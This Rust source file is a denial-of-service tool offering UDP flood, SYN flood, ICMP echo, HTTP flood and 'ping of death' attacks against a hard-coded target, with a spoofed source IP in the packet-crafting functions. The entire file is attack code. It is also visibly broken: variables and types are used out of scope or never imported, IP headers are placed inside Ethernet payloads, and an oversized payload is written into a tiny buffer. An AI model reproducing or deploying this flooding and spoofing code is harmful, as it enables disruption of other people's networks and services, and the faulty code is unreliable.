use std::thread;
use std::time::Duration;
use std::sync::mpsc;
use std::sync::Arc;
use std::sync::Mutex;

use reqwest;
use pnet::packet::icmp::{IcmpPacket, IcmpType};
use pnet::packet::ip::{IpNextHeaderProtocol, IpNextHeaderProtocols};
use pnet::packet::tcp::{TcpPacket, MutableTcpPacket};
use pnet::packet::udp::{UdpPacket, MutableUdpPacket};
use pnet::packet::ipv4::{Ipv4Packet, MutableIpv4Packet};
use pnet::packet::ethernet::{EthernetPacket, MutableEthernetPacket};
use pnet::packet::Packet;
use pnet::transport::{transport_channel, TransportChannelType, TransportSender};
use pnet::util::MacAddr;

fn main() {
    let target = "192.168.0.1".parse().unwrap();
    let fake_ip = "10.0.0.1".parse().unwrap();
    let port = 80;
    let num_packets = 100;
    let burst_interval = Duration::from_secs(1);
    let attack_type = "UDP Flood";

    match attack_type {
        "UDP Flood" => udp_flood_attack(target, port, num_packets, burst_interval),
        "ICMP Echo" => icmp_echo_attack(target, num_packets, burst_interval),
        "SYN Flood" => syn_flood_attack(target, port, num_packets, burst_interval),
        "HTTP Flood" => http_flood_attack(target, port, num_packets, burst_interval),
        "Ping of Death" => ping_of_death_attack(target, num_packets, burst_interval),
        _ => println!("Invalid attack type selected."),
    }
}

fn udp_flood_attack(target: IpAddr, port: u16, num_packets: u32, burst_interval: Duration) {
    let (mut tx, _) = transport_channel(1024, TransportChannelType::Layer3(IpNextHeaderProtocols::Udp)).unwrap();

    for _ in 0..num_packets {
        let mut packet = MutableEthernetPacket::owned(vec![0u8; 42]).unwrap();
        let mut ip_packet = MutableIpv4Packet::new(packet.payload_mut()).unwrap();
        let mut udp_packet = MutableUdpPacket::new(ip_packet.payload_mut()).unwrap();

        ip_packet.set_version(4);
        ip_packet.set_header_length(5);
        ip_packet.set_total_length(42);
        ip_packet.set_ttl(64);
        ip_packet.set_next_level_protocol(IpNextHeaderProtocol::Udp);
        ip_packet.set_source(fake_ip);
        ip_packet.set_destination(target);

        udp_packet.set_source(port);
        udp_packet.set_destination(port);
        udp_packet.set_length(8);

        tx.send_to(packet.packet(), Some(target)).unwrap();

        println!("Sent packet to {} through port: {}", target, port);

        thread::sleep(burst_interval);
    }
}

fn icmp_echo_attack(target: IpAddr, num_packets: u32, burst_interval: Duration) {
    let (mut tx, _) = transport_channel(1024, TransportChannelType::Layer3(IpNextHeaderProtocols::Icmp)).unwrap();

    for _ in 0..num_packets {
        let mut packet = MutableEthernetPacket::owned(vec![0u8; 42]).unwrap();
        let mut ip_packet = MutableIpv4Packet::new(packet.payload_mut()).unwrap();
        let mut icmp_packet = MutableIcmpPacket::new(ip_packet.payload_mut()).unwrap();

        ip_packet.set_version(4);
        ip_packet.set_header_length(5);
        ip_packet.set_total_length(42);
        ip_packet.set_ttl(64);
        ip_packet.set_next_level_protocol(IpNextHeaderProtocol::Icmp);
        ip_packet.set_source(fake_ip);
        ip_packet.set_destination(target);

        icmp_packet.set_icmp_type(IcmpType(8));

        tx.send_to(packet.packet(), Some(target)).unwrap();

        println!("Sent ICMP echo request to {}", target);

        thread::sleep(burst_interval);
    }
}

fn syn_flood_attack(target: IpAddr, port: u16, num_packets: u32, burst_interval: Duration) {
    let (mut tx, _) = transport_channel(1024, TransportChannelType::Layer3(IpNextHeaderProtocols::Tcp)).unwrap();

    for _ in 0..num_packets {
        let mut packet = MutableEthernetPacket::owned(vec![0u8; 54]).unwrap();
        let mut ip_packet = MutableIpv4Packet::new(packet.payload_mut()).unwrap();
        let mut tcp_packet = MutableTcpPacket::new(ip_packet.payload_mut()).unwrap();

        ip_packet.set_version(4);
        ip_packet.set_header_length(5);
        ip_packet.set_total_length(54);
        ip_packet.set_ttl(64);
        ip_packet.set_next_level_protocol(IpNextHeaderProtocol::Tcp);
        ip_packet.set_source(fake_ip);
        ip_packet.set_destination(target);

        tcp_packet.set_source(port);
        tcp_packet.set_destination(port);
        tcp_packet.set_flags(2);
        tcp_packet.set_window(64240);

        tx.send_to(packet.packet(), Some(target)).unwrap();

        println!("Sent SYN packet to {} through port: {}", target, port);

        thread::sleep(burst_interval);
    }
}

fn http_flood_attack(target: IpAddr, port: u16, num_packets: u32, burst_interval: Duration) {
    for _ in 0..num_packets {
        let url = format!("http://{}:{}/", target, port);
        let client = reqwest::blocking::Client::new();
        let response = client.get(&url).send();

        println!("Sent HTTP request to {}", url);

        thread::sleep(burst_interval);
    }
}

fn ping_of_death_attack(target: IpAddr, num_packets: u32, burst_interval: Duration) {
    let (mut tx, _) = transport_channel(1024, TransportChannelType::Layer3(IpNextHeaderProtocols::Icmp)).unwrap();

    for _ in 0..num_packets {
        let mut packet = MutableEthernetPacket::owned(vec![0u8; 70]).unwrap();
        let mut ip_packet = MutableIpv4Packet::new(packet.payload_mut()).unwrap();
        let mut icmp_packet = MutableIcmpPacket::new(ip_packet.payload_mut()).unwrap();

        ip_packet.set_version(4);
        ip_packet.set_header_length(5);
        ip_packet.set_total_length(70);
        ip_packet.set_ttl(64);
        ip_packet.set_next_level_protocol(IpNextHeaderProtocol::Icmp);
        ip_packet.set_source(fake_ip);
        ip_packet.set_destination(target);

        icmp_packet.set_icmp_type(IcmpType(8));
        icmp_packet.set_payload(vec![b'X'; 60000]);

        tx.send_to(packet.packet(), Some(target)).unwrap();

        println!("Sent oversized ICMP packet to {}", target);

        thread::sleep(burst_interval);
    }
}
